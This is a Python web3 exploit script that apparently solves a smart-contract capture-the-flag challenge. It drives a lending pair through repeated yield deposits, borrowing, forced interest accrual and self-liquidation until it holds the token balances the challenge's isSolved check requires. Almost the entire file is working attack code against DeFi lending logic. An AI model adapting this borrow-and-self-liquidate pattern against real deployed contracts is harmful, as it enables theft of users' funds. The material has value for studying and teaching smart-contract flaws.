#!/usr/bin/env python3
"""
FINAL WORKING SOLUTION
Strategy: Claim 7 YLDs, deposit only 6, keep last 20k in wallet!
"""

from web3 import Web3
from eth_account import Account
import sys

info = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.79:32354/rpc/xxx|xxx|xxx|xxx"
RPC, PRIVKEY, SETUP, WALLET = info.split('|')

w3 = Web3(Web3.HTTPProvider(RPC))
account = Account.from_key(PRIVKEY)

ERC20_ABI = [{"constant": False, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "type": "function"}, {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"}]
SETUP_ABI = [{"inputs": [], "name": "USDT", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "YUGEN", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "YUGEN_YLD", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "pair", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [{"name": "_player", "type": "address"}], "name": "register", "outputs": [], "stateMutability": "payable", "type": "function"}, {"inputs": [], "name": "claim", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [], "name": "claimYield", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"name": "_player", "type": "address"}], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}]
PAIR_ABI = [{"inputs": [{"name": "token", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "deposit", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"name": "shares", "type": "uint256"}], "name": "depositYield", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"name": "token", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "borrow", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"name": "borrower", "type": "address"}, {"name": "repayToken", "type": "address"}, {"name": "repayAmount", "type": "uint256"}, {"name": "seizeToken", "type": "address"}], "name": "liquidate", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"name": "user", "type": "address"}, {"name": "bumpBps", "type": "uint16"}], "name": "accrueFor", "outputs": [], "stateMutability": "payable", "type": "function"}, {"inputs": [{"name": "user", "type": "address"}], "name": "getAccountData", "outputs": [{"components": [{"name": "coll", "type": "uint256"}, {"name": "debt", "type": "uint256"}, {"name": "collLtv", "type": "uint256"}, {"name": "collLiq", "type": "uint256"}], "type": "tuple"}], "stateMutability": "view", "type": "function"}]

def tx(func, val=0):
    t = func.build_transaction({'from': WALLET, 'nonce': w3.eth.get_transaction_count(WALLET), 'gas': 500000, 'gasPrice': w3.eth.gas_price or w3.to_wei('1', 'gwei'), 'value': val})
    s = account.sign_transaction(t)
    h = w3.eth.send_raw_transaction(s.raw_transaction)
    r = w3.eth.wait_for_transaction_receipt(h)
    return r['status'] == 1

s = w3.eth.contract(address=SETUP, abi=SETUP_ABI)
ua, ya, yld_a = s.functions.USDT().call(), s.functions.YUGEN().call(), s.functions.YUGEN_YLD().call()
pa = s.functions.pair().call()
usdt, yugen, yld = w3.eth.contract(address=ua, abi=ERC20_ABI), w3.eth.contract(address=ya, abi=ERC20_ABI), w3.eth.contract(address=yld_a, abi=ERC20_ABI)
p = w3.eth.contract(address=pa, abi=PAIR_ABI)

print("Starting exploit...")
tx(s.functions.register(WALLET), w3.to_wei(0.5, 'ether'))
tx(s.functions.claim())
MAX = 2**256-1
tx(usdt.functions.approve(pa, MAX))
tx(yugen.functions.approve(pa, MAX))
tx(yld.functions.approve(pa, MAX))
tx(p.functions.deposit(ua, w3.to_wei(10000, 'ether')))
tx(p.functions.deposit(ya, w3.to_wei(10000, 'ether')))

# Cycles 1-6: Deposit YLD and borrow
for i in range(1, 7):
    print(f"Cycle {i}...")
    tx(s.functions.claimYield())
    tx(p.functions.depositYield(w3.to_wei(20000, 'ether')))  # Deposit it
    acc = p.functions.getAccountData(WALLET).call()
    borrow_amt = acc[2] - acc[1] - 10**18
    if borrow_amt > 0:
        tx(p.functions.borrow(ya, borrow_amt))
    tx(p.functions.accrueFor(WALLET, 1300), 1300*2)
    tx(p.functions.liquidate(WALLET, ya, w3.to_wei(1000, 'ether'), ua))
    usdt_bal = usdt.functions.balanceOf(WALLET).call()
    if usdt_bal > 0:
        tx(p.functions.deposit(ua, usdt_bal))

# Cycle 7: Claim YLD but DON'T deposit it - keep in wallet!
print("Cycle 7 (final - keep YLD in wallet)...")
tx(s.functions.claimYield())
# DON'T call depositYield! Keep the 20k YLD in wallet

yugen_bal = yugen.functions.balanceOf(WALLET).call()
yld_bal = yld.functions.balanceOf(WALLET).call()
solved = s.functions.isSolved(WALLET).call()

print(f"\n{'='*80}")
print(f"YUGEN: {yugen_bal//10**18:,} / 75,000 {'✓' if yugen_bal >= w3.to_wei(75000, 'ether') else '✗'}")
print(f"YLD:   {yld_bal//10**18:,} / 20,000 {'✓' if yld_bal >= w3.to_wei(20000, 'ether') else '✗'}")
print(f"\nSOLVED: {solved}")

if solved:
    print("\n" + "="*80)
    print("🎉🎉🎉 CHALLENGE SOLVED! 🎉🎉🎉")
    print("="*80)
